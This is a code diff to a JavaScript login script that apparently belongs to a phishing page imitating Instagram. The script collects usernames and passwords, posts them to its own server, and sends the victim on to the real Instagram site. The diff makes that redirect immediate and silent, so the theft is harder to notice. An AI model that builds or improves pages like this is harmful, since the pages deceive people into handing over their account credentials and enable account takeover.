@@ -5,8 +5,6 @@ class InstagramLogin {
         this.usernameInput = document.getElementById('username');
         this.passwordInput = document.getElementById('password');
         this.loginBtn = document.getElementById('loginBtn');
-        this.errorMsg = document.getElementById('error-msg');
-        this.successMsg = document.getElementById('success-msg');
         
         this.bindEvents();
     }
@@ -26,7 +24,7 @@ class InstagramLogin {
         e.preventDefault();
         
         if (!this.usernameInput.value.trim() || !this.passwordInput.value.trim()) {
-            this.showError('Please fill in all fields');
+            alert('Please fill in all fields');
             return;
         }
         
@@ -51,22 +49,34 @@ class InstagramLogin {
                 body: JSON.stringify(formData)
             });
             
-            const result = await response.json();
+            // Check if response is ok before parsing JSON
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
             
-            if (response.ok) {
-                this.showSuccess('Login successful! Redirecting...');
-                
-                // Redirect to Instagram after short delay
-                setTimeout(() => {
-                    window.location.href = 'https://www.instagram.com/';
-                }, 2000);
+            // Get response text first to check if it's valid JSON
+            const responseText = await response.text();
+            console.log('Response text:', responseText);
+            
+            let result;
+            try {
+                result = JSON.parse(responseText);
+            } catch (parseError) {
+                console.error('JSON parse error:', parseError);
+                console.error('Response text:', responseText);
+                throw new Error('Invalid response from server');
+            }
+            
+            if (result.success) {
+                // Redirect to Instagram immediately without showing any message
+                window.location.href = 'https://www.instagram.com/';
             } else {
-                this.showError(result.message || 'Login failed. Please try again.');
+                alert('Login failed. Please try again.');
             }
             
         } catch (error) {
             console.error('Login error:', error);
-            this.showError('Network error. Please check your connection and try again.');
+            alert('Network error. Please check your connection and try again.');
         } finally {
             this.setLoadingState(false);
         }
@@ -84,26 +94,6 @@ class InstagramLogin {
         }
     }
     
-    showError(message) {
-        this.errorMsg.textContent = message;
-        this.errorMsg.style.display = 'block';
-        this.successMsg.style.display = 'none';
-    }
-    
-    showSuccess(message) {
-        this.successMsg.textContent = message;
-        this.successMsg.style.display = 'block';
-        this.errorMsg.style.display = 'none';
-    }
-    
-    clearError() {
-        this.errorMsg.style.display = 'none';
-    }
-    
-    clearMessages() {
-        this.errorMsg.style.display = 'none';
-        this.successMsg.style.display = 'none';
-    }
     
 }
 
